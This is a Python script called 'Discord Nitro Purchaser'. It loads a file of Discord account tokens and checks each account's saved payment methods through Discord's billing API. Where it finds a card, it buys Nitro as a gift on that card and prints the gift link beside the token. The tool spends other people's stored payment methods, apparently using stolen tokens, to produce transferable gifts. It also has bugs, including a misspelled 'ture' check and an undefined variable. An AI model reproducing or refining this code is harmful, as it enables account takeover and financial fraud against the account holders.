import ctypes
import os
import sys
import time
from time import gmtime, sleep, strftime

import keyboard
import requests
from colorama import Fore, Style
from dhooks import Embed, File, Webhook # I Forgot What I Used This For, I Think I Removed It

if not os.path.exists(f'Tokens.txt'):
    with open('Tokens.txt', 'w') as f: pass

os.system('cls') 
if os.path.exists('Tokens.txt'):
    tokens = open('Tokens.txt').read()
    if len(tokens) == 0:
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Error Menu')
        print(f'\n{Fore.RED}>{Fore.RESET} Tokens.txt Is Empty')
        print(f'{Fore.RED}>{Fore.RESET} Press [{Fore.RED}ESC{Fore.RESET}] To Exit')
        while True:
            try:
                if keyboard.is_pressed('esc'):
                    ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Exiting...')
                    time.sleep(1)
                    os._exit(0)
            except:
                continue
    else:
        pass

else:
    with open('Tokens.txt', 'w') as f: pass
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Error Menu')    
    print(f'\n{Fore.RED}>{Fore.RESET} Put Your Tokens In Tokens.txt')
    print(f'{Fore.RED}>{Fore.RESET} Press [{Fore.RED}ESC{Fore.RESET}] To Exit')
    while True:
        try:
            if keyboard.is_pressed('esc'):
                ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Exiting...')
                time.sleep(1)
                os._exit(0)
        except:
            continue

purchased = 0
tokens_count = 0
with open('Tokens.txt', 'r') as f:
	for line in f:
		tokens_count += 1
checked = 0
b = Style.BRIGHT
os.system('cls')

ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: None | Checked: {checked}/{tokens_count} | Purchased: {purchased}')

print(f'{Fore.RESET}[{b+Fore.BLUE}1{Fore.RESET}] Nitro Classic Month')
print(f'{Fore.RESET}[{b+Fore.BLUE}2{Fore.RESET}] Nitro Classic Year')
print(f'{Fore.RESET}[{b+Fore.BLUE}3{Fore.RESET}] Nitro Boost Month')
print(f'{Fore.RESET}[{b+Fore.BLUE}4{Fore.RESET}] Nitro Boost Year')
print()
nitrotype = input(f'{b+Fore.BLUE}>{Fore.RESET} Select An Option{b+Fore.BLUE}:{Fore.RESET} ')
print()
if '1' in nitrotype:
    buynitro = "521846918637420545" # Nitro Classic Month
    amount = "499" # Nitro Classic Month Price
    showtype = 'Nitro Boost Month' # Just For Display
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')
elif '2' in nitrotype:
    buynitro = "521846918637420545" # Nitro Classic Year
    amount = "4999" # Nitro Classic Year Price
    showtype = 'Nitro Classic Year' # Just For Display
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')
elif '3' in nitrotype:
    buynitro = "521847234246082599" # Nitro Boost Month
    amount = "999" # Nitro Boost Month Price
    showtype = 'Nitro Boost Month' # Just For Display
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')
elif '4' in nitrotype:
    buynitro = "521847234246082599" # Nitro Boost Year
    amount = "9999"
    showtype = 'Nitro Boost Year' # Just For Display
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')
else:
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Exiting...')
    print(f'{Fore.RESET}[{Fore.RED}{strftime("%H:%M:%S", gmtime())}{Fore.RESET}] Invalid Option')
    time.sleep(5)
    os._exit(0)

def NitroPurchaser(token):
    global money
    global checked
    global amount
    global buynitro
    global tokens_count
    global purchased
    nitrospurchased = 0
    r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
    if r.status_code == 200 and "[]" in r.text:
        print(f'{Fore.RESET}[{Fore.RED}{strftime("%H:%M:%S", gmtime())}{Fore.RESET}] No Payment Method                            {b+Fore.RED}|{Fore.RESET} {token}')
        checked += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')
    elif "You need to verify your account in order to perform this action." in r.text:
        print(f'{Fore.RESET}[{Fore.RED}{strftime("%H:%M:%S", gmtime())}{Fore.RESET}] Token Not Verified                           {b+Fore.RED}|{Fore.RESET} {token}')
        checked += 1
    elif r.status_code == 200:
        payment_source_id = r.json()[0]['id']
        if '"invalid": true' in r.text:
            print(f'{Fore.RESET}[{Fore.RED}{strftime("%H:%M:%S", gmtime())}{Fore.RESET}] Invalid Payment Method                       {b+Fore.RED}|{Fore.RESET} {token}')
            checked += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')
        elif 'This purchase request is invalid.' in r.text:
            print(f'{Fore.RESET}[{Fore.RED}{strftime("%H:%M:%S", gmtime())}{Fore.RESET}] Invalid Payment Method                       {b+Fore.RED}|{Fore.RESET} {token}')
            checked += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')
        elif '"invalid": ture' in r.text:
            r = requests.post(f'https://discord.com/api/v6/store/skus/{buynitro}/purchase', headers={'Authorization': token}, json={'expected_amount': amount,'gift': True,'payment_source_id': payment_source_id})   
            print(r.text)
            gift_code = r.json()['gift_code']
            print(f'{Fore.RESET}[{Fore.GREEN}{strftime("%H:%M:%S", gmtime())}{Fore.RESET}] discord.gift/{gift}        {b+Fore.GREEN}|{Fore.RESET} {token}')
            checked += 1
            purchased += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')
        else:
            print(f'{Fore.RESET}[{Fore.RED}{strftime("%H:%M:%S", gmtime())}{Fore.RESET}] Invalid Payment Method                       {b+Fore.RED}|{Fore.RESET} {token}')
            checked += 1

    elif r.status_code == 401:
        print(f'{Fore.RESET}[{Fore.RED}{strftime("%H:%M:%S", gmtime())}{Fore.RESET}] Invalid Token                                {b+Fore.RED}|{Fore.RESET} {token}')
        checked += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'[Discord Nitro Purchaser] By Dropout | Type: {showtype} | Checked: {checked}/{tokens_count} | Purchased: {purchased}')

if __name__ == "__main__":
    for tokensfile in open('Tokens.txt', 'r').readlines():
        token = tokensfile.strip()  
        NitroPurchaser(token)
    print(f'\n{Fore.BLUE}>{Fore.RESET} Finished')
    print(f'{Fore.BLUE}>{Fore.RESET} Press [{Fore.BLUE}ESC{Fore.RESET}] To Exit')
    while True:
        try:
            if keyboard.is_pressed('esc'):
                break
        except:
            continue
